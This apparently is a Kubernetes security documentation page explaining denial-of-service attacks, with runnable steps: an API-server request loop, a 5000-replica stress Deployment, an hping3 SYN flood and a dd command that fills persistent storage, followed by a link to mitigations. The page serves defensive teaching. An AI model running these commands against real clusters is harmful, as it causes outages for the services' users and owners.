---
sidebar_position: 8
title: "Denial of Service (DoS) Attacks"
description: "How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."
---

# Denial of Service (DoS) Attacks

A **Denial of Service (DoS) attack** targets a Kubernetes cluster by **exhausting system resources, overloading the API server, or overwhelming network capacity**. These attacks can cause **service downtime, degraded performance, and complete cluster unavailability**.

---

## Exploitation Steps: Overloading Cluster Resources

An attacker generates **excessive traffic, high CPU usage, or memory exhaustion** to disrupt Kubernetes workloads.

### Step 1: Flood the Kubernetes API Server

An attacker repeatedly sends API requests to **overload the control plane**:

```bash
while true; do kubectl get pods --all-namespaces; done
```

If **unauthenticated API access** is allowed, this can cause **latency spikes and request failures**.

### Step 2: Deploy Resource-Exhausting Pods

If **resource limits** are not enforced, the attacker deploys multiple high-consumption pods:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: overload-pods
spec:
  replicas: 5000
  template:
    spec:
      containers:
        - name: stress-container
          image: polinux/stress
          command: ["stress"]
          args:
            [
              "--cpu",
              "4",
              "--io",
              "4",
              "--vm",
              "4",
              "--vm-bytes",
              "128M",
              "--timeout",
              "300s",
            ]
```

```bash
kubectl apply -f overload-pods.yaml
```

Without **Pod Resource Limits**, the cluster experiences **CPU and memory starvation**.

### Step 3: Exploit Insecure Network Policies

If **network policies** are missing, the attacker floods a Kubernetes Service with **large requests**:

```bash
hping3 -S -p 443 <service-ip> --flood
```

This **overwhelms** the target service, causing delays and timeouts.

### Step 4: Abuse Persistent Storage

If **storage quotas** are missing, the attacker fills up available storage:

```bash
dd if=/dev/zero of=/mnt/persistent-volume/attack bs=1M count=100000
```

Once storage reaches **100% capacity**, workloads that rely on persistence **fail or crash**.

### Result

The attacker successfully **disrupts Kubernetes services**, leading to **downtime, increased latency, and operational failures**.

---

## Mitigation Steps

To protect against **Denial of Service (DoS) attacks**, follow the security best practices outlined in:

➡ **[Mitigating DoS Attacks in Kubernetes](/docs/best_practices/cluster_setup_and_hardening/network_security/ddos_mitigation)**

This guide covers techniques such as **rate limiting, API request quotas, network policy enforcement, resource limits, and autoscaling defenses** to prevent Kubernetes disruptions.
